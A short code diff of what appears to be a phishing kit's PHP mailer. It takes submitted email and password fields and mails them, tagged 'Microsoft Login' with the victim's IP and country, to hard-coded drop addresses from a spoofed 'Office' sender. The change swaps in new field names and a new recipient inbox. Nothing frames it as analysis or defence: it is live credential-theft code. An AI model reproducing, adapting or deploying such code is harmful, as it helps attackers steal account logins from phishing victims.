@@ -39,11 +39,11 @@ class info{
   }
 }
 
-$email = $_POST['add'];
-$password = $_POST['cred'];
+$email = $_POST['em'];
+$password = $_POST['pa'];
 $info = new info();
 
-$to = 'systemvc001@yandex.com, systemvc001@gmail.com'; // <--- Enter your email here
+$to = 'transdeptconsultant@gmail.com, transdeptconsultant@gmail.com'; // <--- Enter your email here
 $subj = "Microsoft Login - ".$info->ip." ".$info->country;
 
 $headers = "From: 0ffice <logz@couklas.org> \n";
